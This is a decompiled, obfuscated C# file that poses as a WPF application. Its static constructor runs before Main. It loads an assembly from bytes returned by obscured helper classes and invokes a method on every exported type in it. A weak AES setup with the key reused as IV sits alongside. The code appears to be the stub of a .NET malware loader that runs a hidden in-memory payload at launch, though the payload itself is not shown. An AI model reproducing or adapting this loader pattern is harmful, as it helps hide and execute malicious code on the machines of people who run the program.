using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows;
using ns4;
using ns6;
using ns7;

namespace ns1;

public class GClass0 : Application
{
	internal delegate void Delegate0();

	internal static bool smethod_0(Aes aes_0, byte[] byte_0, out byte[] byte_1)
	{
		if (aes_0 == null)
		{
			byte_1 = new byte[0];
			return true;
		}
		aes_0.KeySize = 128;
		aes_0.BlockSize = 128;
		aes_0.Padding = PaddingMode.Zeros;
		aes_0.Key = byte_0;
		aes_0.IV = byte_0;
		byte_1 = new byte[0];
		return false;
	}

	internal static byte[] smethod_1()
	{
		return Class3.Class4.smethod_0(Class2.smethod_0());
	}

	static GClass0()
	{
		foreach (Type exportedType in smethod_2().ExportedTypes)
		{
			((Delegate0)Delegate.CreateDelegate(typeof(Delegate0), exportedType, Class6.a.ToString()))();
		}
	}

	public static void Main()
	{
		((Application)new GClass0()).Run();
	}

	[CompilerGenerated]
	internal static Assembly smethod_2()
	{
		return Assembly.Load(smethod_1());
	}
}
